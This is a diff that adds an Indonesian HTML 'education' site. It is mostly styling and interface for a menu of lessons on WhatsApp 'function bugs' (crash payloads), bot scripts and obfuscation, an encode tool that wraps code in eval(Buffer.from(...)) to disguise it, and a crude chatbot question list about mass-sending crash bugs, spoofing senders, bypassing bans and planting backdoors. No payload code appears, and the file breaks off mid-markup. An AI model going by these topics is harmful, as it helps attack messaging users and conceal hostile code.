@@ -1,0 +1,3077 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Website Edukasi ZalOfficial</title>
+  <style>
+    * { box-sizing: border-box; }
+    html, body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(to bottom right, #060b14, #0d1a2f);
+      color: white;
+      height: 100%;
+    }
+    body {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
+
+.judul-elite {
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 1.2rem;
+  text-align: center;
+  letter-spacing: 1.5px;
+  color: #00c6ff;
+  text-shadow: 
+    0 0 3px #00c6ff,
+    0 0 6px #00c6ff88,
+    0 0 12px #00c6ff55,
+    0 0 20px #00c6ff33;
+  animation: glowFlash 2.5s infinite ease-in-out;
+  margin-bottom: 15px;
+}
+
+@keyframes glowFlash {
+  0%   { text-shadow: 0 0 4px #00c6ff55, 0 0 6px #00c6ff88; }
+  50%  { text-shadow: 0 0 8px #00c6ffcc, 0 0 18px #00c6ffaa; }
+  100% { text-shadow: 0 0 4px #00c6ff55, 0 0 6px #00c6ff88; }
+}
+    .glass {
+      background: rgba(0, 0, 0, 0.4);
+      backdrop-filter: blur(15px);
+      -webkit-backdrop-filter: blur(15px);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      box-shadow: 0 0 25px rgba(0, 204, 255, 0.35);
+      border-radius: 14px;
+      padding: 1rem 1.5rem;
+      width: 95%;
+      max-width: 1000px;
+      text-align: center;
+      animation: fadeIn 1s ease;
+      max-height: 95vh;
+      overflow-y: auto;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    input[type="text"] {
+      width: 100%;
+      padding: 10px;
+      margin: 0.5rem 0;
+      border: none;
+      border-radius: 8px;
+      background: rgba(255,255,255,0.1);
+      color: white;
+      font-size: 0.9rem;
+    }
+#notesPage textarea {
+  width: 100%;
+  min-height: 200px;
+  background: #111;
+  border: 2px solid #66ccff;
+  border-radius: 10px;
+  padding: 15px;
+  font-size: 1rem;
+  color: #aafaff;
+  resize: vertical;
+  font-family: monospace;
+  margin-bottom: 15px;
+}
+.select-toxic {
+  padding: 12px;
+  font-size: 1.05em;
+  border-radius: 10px;
+  background: #1c1c1c;
+  color: #fff;
+  border: 2px solid #ff4444;
+  box-shadow: 0 0 10px #ff444488;
+}
+    button {
+      padding: 6px;
+      border: none;
+      border-radius: 6px;
+      background: linear-gradient(135deg, #00ccff, #007BFF);
+      color: white;
+      font-size: 0.7rem;
+      font-weight: bold;
+      cursor: pointer;
+      box-shadow: 0 0 10px #00ccff88;
+      transition: all 0.3s ease;
+    }
+    button:hover {
+      transform: scale(1.05);
+      box-shadow: 0 0 20px #00ccffcc;
+    }
+    .scroll-container {
+      overflow-x: auto;
+      margin-top: 1rem;
+    }
+.btn {
+  display: block;
+  width: 100%;
+  margin: 0.6rem 0; /* tambah jarak antar tombol */
+  padding: 14px;     /* lebih empuk diklik */
+  font-size: 1rem;
+  background: linear-gradient(145deg, #99e6ff, #66ccff);
+  border: none;
+  border-radius: 10px;
+  color: #000;
+  font-weight: bold;
+  box-shadow: 0 0 12px #00ccff88;
+  cursor: pointer;
+  transition: all 0.2s ease;
+}
+/* Container Editor VS Code Style */
+#editorPage {
+  background: #1e1e1e;
+  color: #d4d4d4;
+  padding: 20px;
+  border-radius: 14px;
+  box-shadow: 0 0 25px rgba(0, 200, 255, 0.3);
+  max-width: 1000px;
+  margin: auto;
+  margin-top: 40px;
+}
+
+/* CodeMirror styling */
+.CodeMirror {
+  height: 80vh;
+  font-family: 'Fira Code', monospace;
+  font-size: 15px;
+  line-height: 1.5;
+  color: #d4d4d4;
+  background: #1e1e1e;
+  border-radius: 10px;
+  border: 1px solid #333;
+  box-shadow: 0 0 10px #00f2ff33;
+}
+
+/* Posisi teks kiri atas */
+.CodeMirror-scroll {
+  text-align: left !important;
+  padding: 0 !important;
+}
+
+/* Dropdown mode selector */
+#modeSelect {
+  background: #252526;
+  color: #c5c5c5;
+  border: 1px solid #444;
+  border-radius: 6px;
+  padding: 6px 10px;
+  font-family: 'Segoe UI', sans-serif;
+  margin-bottom: 10px;
+}
+
+/* Button styling */
+#editorPage .btn {
+  background: linear-gradient(135deg, #00c6ff, #0072ff);
+  color: white;
+  border: none;
+  padding: 10px 18px;
+  border-radius: 8px;
+  font-weight: bold;
+  cursor: pointer;
+  margin: 5px 0;
+  transition: 0.2s ease;
+  box-shadow: 0 0 12px #00d0ff88;
+}
+#editorPage .btn:hover {
+  box-shadow: 0 0 18px #00d0ffaa;
+  transform: scale(1.03);
+}
+
+/* Hasil tampilan code (preview iframe) fullscreen */
+#outputPage {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100vw;
+  height: 100vh;
+  z-index: 900;
+  background: white;
+}
+
+#previewFrame {
+  width: 100%;
+  height: 100%;
+  border: none;
+  display: block;
+  background: #0a192f; /* fallback, just in case */
+}
+    .menu-materi {
+      display: grid;
+      grid-template-rows: repeat(3, auto);
+      grid-auto-flow: column;
+      gap: 8px;
+      padding-bottom: 10px;
+      min-width: max-content;
+    }
+.menu-materi button {
+  white-space: nowrap;
+  padding: 10px 16px;
+  font-size: 0.85rem;
+  background: linear-gradient(145deg, #00c6ff, #0072ff);
+  color: white;
+  border: none;
+  border-radius: 12px;
+  font-weight: bold;
+  box-shadow: 0 0 10px #00e5ff88;
+  cursor: pointer;
+  transition: all 0.2s ease-in-out;
+  min-width: 120px;
+}
+.menu-materi button:hover {
+  transform: scale(1.06);
+  box-shadow: 0 0 18px #00e5ffcc;
+}
+    #dashboard, #materiPage {
+      display: none;
+    }
+    #kontenMateri {
+      text-align: left;
+      margin-top: 1rem;
+      background: rgba(255,255,255,0.05);
+      padding: 0.6rem;
+      border-radius: 6px;
+      font-size: 0.8rem;
+      line-height: 1.5;
+      max-height: 50vh;
+      overflow-y: auto;
+    }
+#toxicWrapper {
+  max-width: 700px;
+  margin: 40px auto 30px auto;
+  padding: 16px 24px;
+  background: rgba(255, 255, 255, 0.03);
+  border: 1px solid rgba(255, 255, 255, 0.06);
+  backdrop-filter: blur(10px);
+  border-radius: 14px;
+  box-shadow: 0 0 18px rgba(200, 200, 200, 0.05);
+  text-align: center;
+}
+
+#toxicText {
+  font-size: 0.95rem;
+  line-height: 1.6;
+  font-family: 'Segoe UI', sans-serif;
+  color: #c0c0c0; /* warna silver */
+  white-space: pre-wrap;
+}
+  </style>
+</head>
+<body>
+<div id="musicControl" style="
+  position: fixed;
+  top: 10px;
+  right: 10px;
+  z-index: 999;
+  background: #000c;
+  padding: 10px;
+  border-radius: 12px;
+  box-shadow: 0 0 10px #00d0ff99;
+">
+  <select id="genreSelector" onchange="loadGenre(this.value)">
+    <option value="">Pilih Lagu</option>
+    <option value="sad">Sad</option>
+    <option value="phonk">Phonk</option>
+    <option value="dj">DJ</option>
+  </select>
+  <button onclick="toggleAudio()" id="playBtn"> Play</button>
+</div>
+<audio id="musicPlayer" loop></audio>
+  <div class="glass" id="loginContainer">
+    <h3 style="text-shadow: 0 0 10px white; font-size: 1rem; margin-bottom: 10px;">Masukkan Nama Kamu</h3>
+    <input id="nama" placeholder="Contoh: Dev Zal">
+    <br>
+    <button onclick="login()">Login</button>
+  </div>
+
+  <div class="glass" id="dashboard">
+<h2 class="judul-elite">
+  Selamat Datang Di Website Elite Ciptaan ZalOfficial
+</h2>
+    <h3 id="welcomeMsg" style="font-size: 1rem;"></h3>
+    <div id="belajarTimer" style="margin-top: 10px; font-size: 0.9rem; color: #aaf;">
+  ⏳ Menghitung waktu belajar...
+</div>
+    <p style="font-size: 0.8rem;">Pilih Materi Yang Kamu Ingin Pelajaran</p>
+    
+    <div class="scroll-container">
+      <div class="menu-materi">
+        <button onclick="showMateri('functionBug')">Apa Itu Function Bug</button>
+        <button onclick="showMateri('scriptWa')">Cara Buat Script Bot WhatsApp</button>
+        <button onclick="showMateri('struktur')">Struktur Project Script</button>
+        <button onclick="showMateri('scriptTelegram')">Cara Buat Script Bot Telegram</button>
+        <button onclick="showMateri('pasangFunction')">Cara Pasang Function Bug</button>
+        <button onclick="showMateri('handler')">Command Bot</button>
+        <button onclick="showMateri('proteksi')">Cara Lindungi Script</button>
+        <button onclick="showMateri('hosting')">Cara Hosting di VPS</button>
+        <button onclick="showMateri('pterodactyl')">Panel Pterodactyl</button>
+        <button onclick="showMateri('autodeploy')">Auto Deploy Bot</button>
+        <button onclick="showMateri('jsonapi')">JSON & API</button>
+        <button onclick="showMateri('obfuscate')">Obfuscate & Protect</button>
+        <button onclick="showMateri('panelWeb')">Website Panel Sendiri</button>
+        <button onclick="showMateri('uploadVPS')">Upload File ke VPS</button>
+<button onclick="showMateri('carabuatFunc')">Cara Buat Function Bug</button>
+        <button onclick="showMateri('customPayload')">Cara Custom Payload</button>
+        <button onclick="showMateri('deteksiBug')">Deteksi Bug</button>
+        <button onclick="showMateri('strukturCrash')">Struktur Crash</button>
+        <button onclick="showMateri('etika')">Etika & Legalitas</button>
+        <button onclick="showMateri('perbedaanBugVirus')">Perbedaan Bug Dan Virus</button>
+        <button onclick="showMateri('pushInvisible')">Push Tanpa Simpan</button>
+<button onclick="bukaErrorChecker()">Cek Error Pada Script</button>
+<button onclick="bukaEncodeTools()">Encode & Decode Tools</button>
+<button onclick="bukaPasswordGenerator()">Password Generator</button>
+<button onclick="bukaKuis()">Kuis Edukasi</button>
+<button onclick="bukaNotes()">Buat Catatan</button>
+<button onclick="bukaKalkulator()">Kalkulator</button>
+<button onclick="bukaTerminal()">Terminal</button>
+<button onclick="bukaEditor()">The Code</button>
+<button onclick="bukaVirusScanner()">Cek Virus</button>
+<button onclick="bukaCryptoTool()">Crypto Tool</button>
+<button onclick="bukaBackdoorDetector()">Cek Backdoor</button>
+<button onclick="bukaToxicAiBot()">Chat Ai</button>
+      </div>
+    </div>
+<div id="toxicWrapper">
+  <div id="toxicText"></div>
+</div>
+
+      <a href="https://wa.me/6289524134626" target="_blank" style="display: inline-block; margin-top: 5px; padding: 5px 10px; background: #007BFF; color: white; border-radius: 5px; text-decoration: none; font-weight: bold;">
+        Hubungi Developer
+      </a>
+    </div>
+  </div>
+<div class="glass" id="ipChecker" style="display:none">
+  <h3 style="font-size: 1.4rem; text-align:center;">
+  <span style="color:#00eaff; text-shadow:0 0 10px #00ffffaa;">IP & Device Info</span>
+</h3>
+  <div class="info-box" id="ip">IP: Memuat...</div>
+  <div class="info-box" id="ua">User Agent: Memuat...</div>
+  <div class="info-box" id="os">Sistem Operasi: Memuat...</div>
+  <div class="info-box" id="browser">Browser: Memuat...</div>
+  <div class="info-box" id="location">Lokasi: Memuat...</div>
+  <br>
+  <button onclick="kembaliDashboard()">Kembali</button>
+</div>
+<div class="glass" id="notesPage" style="display: none;">
+  <h2>Notes - The End</h2>
+  <textarea id="noteArea" placeholder="Tulis catatan atau kode kamu di sini..."></textarea>
+  <button class="btn" onclick="simpanKeFile()">Simpan ke File</button>
+  <button class="btn logout" onclick="kembaliDashboard()">Kembali ke Dashboard</button>
+</div>
+  <!-- Bagian materiPage -->
+<div class="glass" id="materiPage">
+  <h3 id="judulMateri" style="font-size: 1rem;"></h3>
+  <div id="kontenMateri"></div>
+  <br>
+  <button onclick="kembaliDashboard()">Kembali</button>
+</div>
+<div class="glass" id="encodeTools" style="display:none;">
+  <h3 style="text-align:center; color:#66ccff; text-shadow: 0 0 10px white;">Encode & Decode Tools</h3>
+
+  <input type="file" accept=".js,.txt" onchange="handleFile(event)" class="btn" style="margin:auto; display:block;"/>
+
+  <div class="input-area" style="display:flex; flex-wrap:wrap; gap:15px; margin-top:1rem;">
+    <textarea id="inputText" placeholder="Paste teks/script..." style="flex:1 1 48%; height:220px; background:#0e1c26; color:#aafaff;"></textarea>
+    
+    <div style="flex:1 1 48%; display:flex; flex-direction:column;">
+      <textarea id="outputText" placeholder="💬 Hasil..." readonly style="height:220px; background:#0e1c26; color:#aafaff;"></textarea>
+      <button class="btn" onclick="salinHasil()">Salin Hasil</button>
+      <p id="notifSalin" style="text-align:center; font-size:0.85rem;"></p>
+    </div>
+  </div>
+
+  <div style="margin-top:1rem; text-align:center;">
+    <button class="btn" onclick="encodeText()">Encode - The End</button>
+    <button class="btn" onclick="decodeText()">Decode - The End</button>
+    <button class="btn" onclick="resetText()">Reset</button>
+    <br><br>
+    <button onclick="kembaliDariEncodeTools()">Kembali ke Dashboard</button>
+  </div>
+
+  <div class="info" style="margin-top:2rem; font-size:0.85rem;">
+    <strong>Penjelasan:</strong><br>
+    Encode: mengubah teks jadi Base64<br>
+    Decode: mengembalikan dari Base64<br>
+    Output encode dibungkus pakai `eval(Buffer.from(...))` buat penyamaran script.
+  </div>
+</div>
+<div class="glass" id="passwordGenerator" style="display:none;">
+  <h3 style="text-align:center; color:#aeefff; text-shadow: 0 0 10px white;">Password Generator - The End</h3>
+
+  <label style="margin-top: 10px;">
+    Panjang Password:
+    <input type="number" id="length" value="12" min="4" max="50" style="width: 60px; padding: 5px; margin-left: 8px;">
+  </label>
+
+  <label><input type="checkbox" id="includeUpper" checked>Gunakan Huruf Besar</label><br>
+  <label><input type="checkbox" id="includeNumbers" checked>Gunakan Angka</label><br>
+  <label><input type="checkbox" id="includeSymbols" checked>Gunakan Simbol</label><br>
+
+  <div style="margin-top: 15px; background:#0e1c26; padding: 15px; border-radius: 10px; border: 1px solid #66ccff; color:#aafaff;" id="passwordOutput">
+    Password akan muncul di sini
+  </div>
+
+  <div style="margin-top: 10px; text-align:center;">
+    <button class="btn" onclick="generatePassword()">Generate Password</button>
+    <button class="btn" onclick="salinPassword()">Salin Password</button><br><br>
+    <button onclick="kembaliDariPasswordGenerator()">Kembali ke Dashboard</button>
+  </div>
+
+  <div class="footer" style="margin-top:20px; font-size: 0.85rem; color:#ccc; text-align:center;">
+    Website ini membantu kamu membuat password aman dan acak.<br>
+    Contact Dev Zal: <a href="https://wa.me/6289524134626" style="color:#66ccff;">Klik di sini</a>
+  </div>
+</div>
+<div class="glass" id="kuisPage" style="display:none;">
+  <h2 id="question">Memuat soal...</h2>
+  <div id="options"></div>
+  <div id="scoreArea" style="display:none;">
+    <h3 id="scoreText"></h3>
+    <button class="btn" onclick="loadKuis()">Main Lagi</button>
+    <button class="btn logout" onclick="kembaliDashboard()">Kembali ke Dashboard</button>
+  </div>
+</div>
+<div class="glass" id="kalkulatorPage" style="display: none;">
+  <h2>Kalkulator - The End</h2>
+  <input type="number" id="num1" placeholder="Angka Pertama">
+  <input type="number" id="num2" placeholder="Angka Kedua">
+  <div class="buttons" style="margin-top: 15px; display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px;">
+    <button class="btn" onclick="hitung('+')">+</button>
+    <button class="btn" onclick="hitung('-')">−</button>
+    <button class="btn" onclick="hitung('*')">×</button>
+    <button class="btn" onclick="hitung('/')">÷</button>
+  </div>
+  <div id="hasil" style="margin-top: 20px; font-size: 1.2rem;"></div>
+  <button class="btn logout" style="margin-top: 20px;" onclick="kembaliDashboard()">Kembali ke Dashboard</button>
+</div>
+<div class="glass" id="terminalPage" style="display: none;">
+  <h2>Terminal The End</h2>
+  <div id="terminalOutput" style="background:#111; color:#0f0; padding:10px; height:200px; overflow:auto; font-family:monospace;"></div>
+  <input id="terminalInput" type="text" placeholder="Ketik perintah..." style="width:100%; padding:10px; margin-top:10px;" onkeydown="if(event.key==='Enter') runCommand()">
+  <button class="btn logout" onclick="kembaliDashboard()">Kembali ke Dashboard</button>
+</div>
+<div class="glass" id="virusScannerPage" style="display:none;">
+  <h1 style="color:#66ccff; text-align:center; text-shadow: 0 0 10px white;">The End - Virus Scanner</h1>
+  
+  <div class="controls" style="text-align:center; margin-top: 1rem;">
+    <input type="file" accept=".js,.txt" onchange="handleFileVirus(event)" class="btn" />
+    <button class="btn" onclick="scanVirus()">Scan Virus</button>
+    <button class="btn" onclick="resetVirus()">Reset</button>
+  </div>
+
+  <textarea id="virusCode" placeholder="Ketik atau paste script kamu di sini..." style="width:100%; height:200px; background:#0e1a26; color:#aafaff; border-radius:12px; padding:15px; margin-top:20px;"></textarea>
+
+  <div class="result" id="virusHasil" style="display:none; background:#101820; border-left:5px solid #00ffff; padding:15px; border-radius:10px; box-shadow: 0 0 15px #00ffff33; margin-top: 20px;"></div>
+
+  <div style="text-align:center; margin-top:20px;">
+    <button class="btn" onclick="kembaliDashboard()">⬅ Kembali ke Dashboard</button>
+  </div>
+</div>
+<div class="glass" id="cryptoToolPage" style="display: none;">
+  <h2 style="text-align:center; color:#66ccff;">🔐 Crypto Tool (Hash & AES)</h2>
+
+  <textarea id="cryptoInput" placeholder="🔤 Teks yang ingin di-hash atau dienkripsi..." style="width:100%; height:100px; padding:12px; border-radius:10px;"></textarea>
+
+  <div style="margin-top:10px;">
+    🔢 <label>Pilih Mode:</label>
+    <select id="cryptoMode" style="padding:8px; border-radius:6px;">
+      <option value="md5">Hash MD5</option>
+      <option value="sha256">Hash SHA256</option>
+      <option value="aes-encrypt">AES Encrypt</option>
+      <option value="aes-decrypt">AES Decrypt</option>
+    </select>
+  </div>
+
+  <div id="aesKeyInput" style="margin-top:10px;">
+    🔑 Kunci AES:
+    <input type="text" id="aesKey" placeholder="Masukkan kunci AES..." style="width:100%; padding:8px; border-radius:8px;">
+  </div>
+
+  <div style="text-align:center; margin-top:15px;">
+    <button class="btn" onclick="prosesCrypto()">⚙️ Proses</button>
+    <button class="btn" onclick="resetCrypto()">🔄 Reset</button>
+  </div>
+
+  <div id="cryptoOutput" style="margin-top:20px; background:#0e1c26; color:#aafaff; padding:12px; border-radius:10px;"></div>
+
+  <div style="text-align:center; margin-top:20px;">
+    <button class="btn" onclick="kembaliDashboard()">⬅ Kembali ke Dashboard</button>
+  </div>
+</div>
+<div class="glass" id="backdoorPage" style="display: none;">
+  <h2 style="text-align:center; color:#66ccff;"> The End - Backdoor Detector</h2>
+
+  <input type="file" accept=".js,.txt" onchange="handleBackdoorFile(event)" class="btn" style="margin-bottom:15px;">
+
+  <textarea id="backdoorInput" placeholder="Paste script atau upload file untuk dicek..." style="width:100%; height:200px; background:#0e1c26; color:#aafaff; padding:12px; border-radius:10px;"></textarea>
+
+  <div style="text-align:center; margin: 15px 0;">
+    <button class="btn" onclick="cekBackdoor()">🔍 Scan</button>
+    <button class="btn" onclick="resetBackdoor()">🔄 Reset</button>
+  </div>
+
+  <div id="backdoorHasil" style="background:#101820; padding:15px; border-left:5px solid #00ffff; border-radius:10px; box-shadow: 0 0 15px #00ffff33;"></div>
+
+  <div style="text-align:center; margin-top:20px;">
+    <button class="btn" onclick="kembaliDashboard()">⬅ Kembali ke Dashboard</button>
+  </div>
+</div>
+<div class="glass" id="toxicAiBot" style="display:none;">
+  <h2 style="text-align:center; color:#ff3333; font-size:2em;">The End Ai</h2>
+  <p style="text-align:center; font-style:italic; color:#ccc; font-size:1.1em;">
+    Lo buka AI ini buat apa? Biar bisa ngebug WA pacar pake viewOnce delay? Goblok. Coding bukan buat gaya, apalagi kalau otak lo mentok di banned-an, bug wa-an doang. Kalau nanya aja masih typo, udah pasti belajar juga males. Mangkanya Dev ZalOfficial bikin Ai ini biar bocil kayak lo bisa upgrade skill. Jika pertanyaan tidak sesuai sama nomer maklumi saja, karena buat website edukasi tidak gampang
+  </p>
+
+  <div style="text-align:center; margin-bottom:15px;">
+    <select id="toxicSelect" class="select-toxic">
+      <option value="0">Apa itu JavaScript?</option>
+      <option value="1">Kenapa script gue error mulu?</option>
+      <option value="2">Apa gunanya HTML?</option>
+      <option value="3">Kenapa bot WhatsApp ga jalan?</option>
+      <option value="4">Apa itu API?</option>
+      <option value="5">Cara deploy ke VPS?</option>
+      <option value="6">Apa itu obfuscator?</option>
+      <option value="7">Kenapa web gue lemot?</option>
+      <option value="8">Gimana bikin bot anti-detect?</option>
+      <option value="9">Console.log gak muncul?</option>
+      <option value="10">Apa itu VPS?</option>
+<option value="11">Bedanya shared hosting sama VPS?</option>
+<option value="12">Cara kerja VPS itu gimana?</option>
+<option value="13">Apa itu panel Pterodactyl?</option>
+<option value="14">Cara install bot di VPS?</option>
+<option value="15">Gimana cara remote VPS?</option>
+<option value="16">Apa itu SSH?</option>
+<option value="17">Kenapa VPS gue lambat?</option>
+<option value="18">Gimana cara pasang domain ke VPS?</option>
+<option value="19">Kenapa domain ga nyambung ke server?</option>
+<option value="20">Cara pasang SSL gratis di VPS?</option>
+<option value="21">Apa itu Cloudflare?</option>
+<option value="22">Gimana cara setting DNS di Cloudflare?</option>
+<option value="23">Apa itu reverse proxy?</option>
+<option value="24">Cara host web HTML statis di VPS?</option>
+<option value="25">Bedanya HTTP sama HTTPS?</option>
+<option value="26">Kenapa SSL expired?</option>
+<option value="27">Cara auto renew SSL di VPS?</option>
+<option value="28">Kenapa port 80 gue ga bisa dibuka?</option>
+<option value="29">Cara buka port di firewall VPS?</option>
+<option value="30">Apa itu ufw?</option>
+<option value="31">Cara install Nginx di VPS?</option>
+<option value="32">Apa itu Apache?</option>
+<option value="33">Nginx vs Apache, mana bagus?</option>
+<option value="34">Cara host Node.js app di VPS?</option>
+<option value="35">Kenapa Node.js gue mati terus?</option>
+<option value="36">Apa itu PM2?</option>
+<option value="37">Cara auto start bot saat VPS reboot?</option>
+<option value="38">Gimana cara login ke panel Ptero?</option>
+<option value="39">Cara upload file ke VPS?</option>
+<option value="40">Apa itu FTP?</option>
+<option value="41">Tools upload file ke VPS?</option>
+<option value="42">Cara backup VPS manual?</option>
+<option value="43">VPS gue kena DDoS, harus gimana?</option>
+<option value="44">Kenapa website gue error 502?</option>
+<option value="45">Cara setting subdomain di VPS?</option>
+<option value="46">Apa itu nameserver?</option>
+<option value="47">Gimana cara beli domain murah?</option>
+<option value="48">VPS gratis yang bagus ada gak?</option>
+<option value="49">Cara pasang panel Ptero sendiri?</option>
+<option value="50">Apa itu Let's Encrypt?</option>
+<option value="51">Cara pasang HTTPS otomatis di web?</option>
+<option value="52">Kenapa IP VPS gue ke-blacklist?</option>
+<option value="53">Apa itu CDN dan manfaatnya?</option>
+<option value="54">Cara deploy web pakai GitHub + VPS?</option>
+<option value="55">Bot gue gak bisa online di Ptero, kenapa?</option>
+<option value="56">Cara setting environment variable di VPS?</option>
+<option value="57">VPS CentOS vs Ubuntu, pilih yang mana?</option>
+<option value="58">Apa itu LAMP Stack?</option>
+<option value="59">Cara monitoring VPS biar gak down?</option>
+<option value="60">Gimana cek CPU dan RAM VPS?</option>
+<option value="61">Apa itu bug WhatsApp?</option>
+<option value="62">Kenapa bug WA sekarang udah susah nyebar?</option>
+<option value="63">Cara buat function bug sendiri?</option>
+<option value="64">Perbedaan bug dan virus?</option>
+<option value="65">Kenapa bug cuma bisa sekali kirim doang?</option>
+<option value="66">Fungsi dari script "viewOnce crash" itu apa?</option>
+<option value="67">Apa itu bug format contextInfo?</option>
+<option value="68">Gimana cara kirim bug massal ke WA?</option>
+<option value="69">Apa itu bug invisible?</option>
+<option value="70">Kenapa bug chat WA gak efek ke semua target?</option>
+<option value="71">Apa itu payload delay?</option>
+<option value="72">Cara kirim bug SW delay 2024?</option>
+<option value="73">Gimana buat function crash group?</option>
+<option value="74">Apa itu viewOnceMessage + imageMessage bug?</option>
+<option value="75">Cara push bug tanpa simpan nomor?</option>
+<option value="76">Script force close itu gimana kerjanya?</option>
+<option value="77">Apa itu `groupStatusMentionMessage`?</option>
+<option value="78">Kenapa bug cuma ngelag, ga FC?</option>
+<option value="79">Cara deteksi nomor kebal bug?</option>
+<option value="80">Apa itu JSON payload di function bug?</option>
+<option value="81">Gimana struktur script bug WhatsApp?</option>
+<option value="82">Kenapa banyak bug udah ga work?</option>
+<option value="83">Script bug 2023 work di 2025 gak?</option>
+<option value="84">Cara encode payload biar ga gampang dicopas?</option>
+<option value="85">Kenapa script Telegram bot saya no response?</option>
+<option value="86">Cara buat bot Telegram dari 0?</option>
+<option value="87">Apa itu Telegraf.js?</option>
+<option value="88">Perbedaan bot WA vs bot Telegram?</option>
+<option value="89">Cara pasang bot WA dengan Baileys?</option>
+<option value="90">Kenapa Baileys error LOGIN CODE?</option>
+<option value="91">Cara auto reconnect bot WhatsApp?</option>
+<option value="92">Command bot WA selalu undefined?</option>
+<option value="93">Apa itu Command Handler?</option>
+<option value="94">Struktur project bot biar gak acak-acakan?</option>
+<option value="95">Apa itu obfuscator script?</option>
+<option value="96">Gimana lindungi script dari rename bocil?</option>
+<option value="97">Cara auto deploy bot WA ke VPS?</option>
+<option value="98">Gimana upload file ke VPS dari HP?</option>
+<option value="99">Bot WA gue ke-banned, harus gimana?</option>
+<option value="100">Kenapa banned WA makin cepat sekarang?</option>
+<option value="101">Gimana cara bypass banned WhatsApp?</option>
+<option value="102">Apa itu Pterodactyl Panel?</option>
+<option value="103">Cara install Baileys di panel Ptero?</option>
+<option value="104">JSON API di bot WA itu fungsinya apa?</option>
+<option value="105">Gimana cara munculin debug log error?</option>
+<option value="106">Kenapa script bisa crash pas send bug?</option>
+<option value="107">Kenapa group bug gak masuk pesan?</option>
+<option value="108">Fungsi contextInfo di setiap bug WA?</option>
+<option value="109">Kenapa bug tidak terbaca di versi WA terbaru?</option>
+<option value="110">Cara manual encode payload?</option>
+<option value="111">Apa itu quotedMessage exploit?</option>
+<option value="112">Kenapa imageViewOnce lebih kuat efeknya?</option>
+<option value="113">Function bug "ExternityFuckBlank" fungsinya apa?</option>
+<option value="114">Cara kerja payload delay toxic?</option>
+<option value="115">Gimana cara ngeload crash video base64?</option>
+<option value="116">Kenapa bug gagal kirim padahal script jalan?</option>
+<option value="117">Kenapa harus pakai prepareWAMessageMedia?</option>
+<option value="118">Apa itu fake quoted context di bug?</option>
+<option value="119">Gimana cara validasi nomor WhatsApp aktif?</option>
+<option value="120">Script Telegram kena flood, gimana fixnya?</option>
+<option value="121">Kenapa bug viewOnce gak ngaruh ke WA mod?</option>
+<option value="122">Apakah bug invisible masih work di WA 2025?</option>
+<option value="123">Kenapa contextInfo bisa bikin crash?</option>
+<option value="124">Apa itu crash payload multilayer?</option>
+<option value="125">Kenapa bug crash cuma work di group tertentu?</option>
+<option value="126">Kenapa script bot gue error padahal tinggal copy?</option>
+<option value="127">Gimana cara pasang backdoor elegan?</option>
+<option value="128">Apa itu `forwardMessageContent` di Baileys?</option>
+<option value="129">Kenapa script yang dishare error semua?</option>
+<option value="130">Cara kirim bug yang efeknya delay 10 detik?</option>
+<option value="131">Apa beda bug freeze vs bug crash?</option>
+<option value="132">Kenapa bug ga bikin FC tapi bikin stuck?</option>
+<option value="133">Apa itu quoted contextMessage + viewOnce?</option>
+<option value="134">Kenapa bot Telegram gue sering kena limit?</option>
+<option value="135">Gimana cara spoof sender ID di WA bot?</option>
+<option value="136">Kenapa error saat load `prepareWAMessageMedia`?</option>
+<option value="137">Apa yang bikin bug WhatsApp dianggap spam?</option>
+<option value="138">Kenapa bug delay harus pakai quoted image?</option>
+<option value="139">Kenapa payload base64 bikin force logout?</option>
+<option value="140">Cara protect payload biar gak dicuri bocil?</option>
+<option value="141">Kenapa log "Baileys Disconnected" terus muncul?</option>
+<option value="142">Apa penyebab utama bot WA jadi lag?</option>
+<option value="143">Kenapa bot Telegram no response pas spam?</option>
+<option value="144">Cara deteksi nomor target kebal delay bug?</option>
+<option value="145">Kenapa push bug ke status ga semua kena?</option>
+<option value="146">Kenapa handler command saya berantakan?</option>
+<option value="147">Cara handle error `[Error: undefined]` di Baileys?</option>
+<option value="148">Kenapa script forceclose cuma bikin reconnect?</option>
+<option value="149">Cara delay antar kirim bug biar gak banned?</option>
+<option value="150">Apa itu groupStatusMentionMessage di Baileys?</option>
+<option value="151">Kenapa push bug ke status muncul "view once expired"?</option>
+<option value="152">Gimana kirim bug invisible ke status?</option>
+<option value="153">Kenapa Baileys deprecated method terus?</option>
+<option value="154">Apa beda quotedMessage & fakeQuoted?</option>
+<option value="155">Cara inject crash video ke bug message?</option>
+<option value="156">Kenapa bot WA stuck di “Pairing Required”?</option>
+<option value="157">Kenapa bot WA langsung logout setelah deploy?</option>
+<option value="158">Kenapa Baileys login code lama muncul terus?</option>
+<option value="159">Apa solusi banned nomor utama?</option>
+<option value="160">Gimana kerja group flood bug?</option>
+<option value="161">Cara buat function "push tanpa simpan"?</option>
+<option value="162">Kenapa spam bug selalu mentok limit?</option>
+<option value="163">Kenapa contextInfo bisa bikin banned?</option>
+<option value="164">Cara bypass system anti-bug WA baru?</option>
+<option value="165">Kenapa invisible bug gagal kirim?</option>
+<option value="166">Apa itu function `ControlNative` di script bug?</option>
+<option value="167">Kenapa push SW delay jadi detect spam?</option>
+<option value="168">Cara crash-in group tanpa masuk grup?</option>
+<option value="169">Kenapa bug cuma jalan kalau pakai quoted?</option>
+<option value="170">Kenapa error saat load `proto.viewOnceMessage`?</option>
+    </select>
+    <button class="btn" style="margin-left:10px;" onclick="jawabToxicSelect()">Tanya Ai</button>
+  </div>
+
+<div id="toxicOutput" style="
+  display: flex;
+  flex-direction: column;
+  gap: 16px;
+  padding: 20px;
+  font-family: 'Segoe UI', sans-serif;
+  border-radius: 18px;
+  background: linear-gradient(to bottom right, #0f0f0f, #1b1b1b);
+  box-shadow: 0 0 25px #00ffff22, 0 0 60px #0066ff11;
+  border: 1px solid #333;
+">
+  <div id="pertanyaanToxic" style="
+    align-self: flex-end;
+    background: linear-gradient(to top left, #66ccff, #3399ff);
+    color: #000;
+    padding: 14px 18px;
+    border-radius: 20px 20px 4px 20px;
+    max-width: 75%;
+    font-weight: bold;
